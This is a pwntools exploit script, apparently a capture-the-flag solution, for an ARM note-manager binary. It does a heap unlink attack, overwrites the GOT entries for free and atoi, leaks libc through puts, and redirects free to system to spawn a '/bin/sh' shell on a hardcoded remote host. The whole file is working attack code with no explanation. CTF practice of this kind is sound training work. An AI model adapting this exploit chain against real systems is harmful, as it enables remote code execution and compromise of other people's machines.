#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 3
context(log_level="debug", arch="arm", os="linux")
if debug == 1:
    p = process(['qemu-arm', '-g', '12345', '-L', '/usr/arm-linux-gnueabi', './chall'])
elif debug == 2:
    p = process(['qemu-arm', '-L', '/usr/arm-linux-gnueabi', './chall'])
else:
    p = remote('139.9.133.160', 10000)
elf = ELF('./chall', checksec=False)


def add(add_size, add_content):
    p.sendafter('  your choice: \n', '1')
    p.sendlineafter('Note size :', str(add_size))
    p.sendafter('Content :', add_content)


def delete(delete_idx):
    p.sendafter('  your choice: \n', '2')
    p.sendlineafter('Index :', str(delete_idx))


def show(show_idx):
    p.sendafter('  your choice: \n', '3')
    p.sendafter('Index :', str(show_idx))


def edit(edit_idx, edit_content):
    p.sendafter('  your choice: \n', '5')
    p.sendafter('Index :', str(edit_idx))
    p.sendafter('You content:', edit_content)


got_free = elf.got['free']
got_atoi = elf.got['atoi']
plt_puts = elf.plt['puts']
addr_notelist = 0x02108c
addr_count = 0x021064

p.sendlineafter('Tell me your name:', 'binLep')
add(0x40, 'a' * 4)  # 1
add(0x80, 'b' * 4)  # 2
add(0x80, 'c' * 4)  # 3
delete(1)
delete(2)
pd = p32(0) + p32(0x81)
pd += p32(addr_notelist - 0xc) + p32(addr_notelist - 0x8)
pd += 'd' * 0x70
pd += p32(0x80) + p32(0x80)
add(0x100, pd)  # 4
delete(2)
pd = p32(0) + p32(0)
pd += p32(got_atoi) + p32(got_free)
edit(1, pd)
add(0x80, '/bin/sh')  # 5
add(0x80, '/bin/sh')  # 6
add(0x80, '/bin/sh')  # 7
add(0x80, '/bin/sh')  # 8
add(0x80, '/bin/sh')  # 9
edit(1, p32(plt_puts))
delete(0)

addr_atoi = u32(p.recv(4))
libcbase = addr_atoi - 0x025271
addr_system = libcbase + 0x02c771
addr_bin_sh = libcbase + 0x0ca574

edit(1, p32(addr_system))
success('addr_atoi   = ' + hex(addr_atoi))
success('addr_system = ' + hex(addr_system))
delete(7)
p.interactive()
